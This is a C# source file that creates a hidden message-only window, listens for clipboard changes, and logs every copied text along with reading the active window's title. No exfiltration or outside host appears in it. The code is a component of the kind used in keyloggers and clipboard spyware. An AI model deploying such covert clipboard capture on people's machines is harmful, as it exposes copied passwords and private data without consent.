using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Clipboard
{
    internal static class NativeMethods
    {
        public const int WM_CLIPBOARDUPDATE = 0x031D;

        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        public static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
    }

    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            public NotificationForm()
            {
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                {
                    var activeWindow = NativeMethods.GetForegroundWindow();
                    var length = NativeMethods.GetWindowTextLength(activeWindow);
                    var sb = new StringBuilder(length + 1);
                    NativeMethods.GetWindowText(activeWindow, sb, sb.Capacity);
                    Trace.WriteLine("");
                    Trace.WriteLine("\t[Сtrl-C] Clipboard Copied: " + GetText());
                }

                base.WndProc(ref m);
            }

            public static string GetText()
            {
                var returnValue = string.Empty;
                var thread = new Thread(
                    () => returnValue = System.Windows.Forms.Clipboard.GetText());
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                thread.Join();

                return returnValue;
            }
        }
    }
}